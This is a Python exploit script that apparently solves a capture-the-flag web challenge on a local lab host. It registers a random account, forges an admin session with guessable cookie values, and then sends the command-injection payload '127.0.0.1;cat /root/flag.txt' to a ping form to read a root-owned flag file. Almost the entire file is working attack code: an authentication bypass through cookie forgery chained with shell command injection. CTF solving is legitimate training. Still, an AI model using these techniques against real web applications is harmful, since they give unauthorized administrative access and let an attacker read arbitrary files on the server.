import requests
import random
import re 

#Edit these variables based on the requirements

#url = input()              #uncomment this line if you have to take the url at runtime
url = 'http://172.17.0.2/'          #url for the challenge. Provide port if necessaru (ip:port)
flag_format = 'flag'        #enter part outside braces flag{} -> flag. Default set to 'flag'
rgx = '{[a-zA-z_\.~\-]*}'   #if flag contains other charactrs add it here(some characters need to be escaped \)
payload = '127.0.0.1;cat /root/flag.txt' #The payload to be executed . Change if necessary
admin_username = 'admin'  #Default cred
admin_cookie = '1340'     #Default cred
username = ''
password = ''
username_size = 10
password_size = 10


def random_string(size):
    character_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    s = ''
    for i in range(size):
        s += random.choice(character_list)
    return s


if __name__ == "__main__":
    #Signup part
    while True:
        username = random_string(username_size)
        password = random_string(password_size)
        data = {
            'username' : username,
            'password' : password,
            'check_password' : password
        }
        response = requests.post(url + 'signup_info', data)
        if ("Username already exists" not in response):
            break
    print(1)
    #Login part
    data = {
        'username' : username,
        'password' : password
    }
    response = requests.post(url + 'login_info', data)
    response = response.text
    print(2)
    #Admin page access
    data = {
        'user' : admin_username,
        'user_id' : admin_cookie
    }
    headers = {
        "Cookie" : "user_id=" + str(admin_cookie) + "; user=" + str(admin_username)
    }
    response = requests.get(url + 'logged_in', headers = headers)
    response = response.text
    print(3)
    #Ping request to get flag using command injection
    data = {
        'ip' : payload
    }
    headers = {
        "Cookie" : "user_id=" + str(admin_cookie) + "; user=" + str(admin_username)
    }
    response = requests.post(url + 'pinger', data = data, headers = headers)
    response = response.text
    flag_string = re.findall((flag_format+rgx),response)

    if flag_string :
        print(flag_string)
    else :
        print("Flag not found.")
        print("Make sure the flag text file name and path are correct")
        print("If it's still not working check the url, payload, flag format , regex characters ")
#    if ((flag_format+rgx) not in response):
#        print('Contact the challenge dev after trying to run the script again if it wont return the flag.')
#    else:
#
#       print(response)
#       temp = response.find((flag_format+rgx))
#        j = temp
#        k = 0
#        for i in range(len(response)):
#           if (i == 0):
#               j += 5
#            else:
#                if (response[j] == "}"):
#                    k = j
#                    break
#                else:
#                    j += 1
#        print(response[j:k])

#sorry block comments were not working for me.......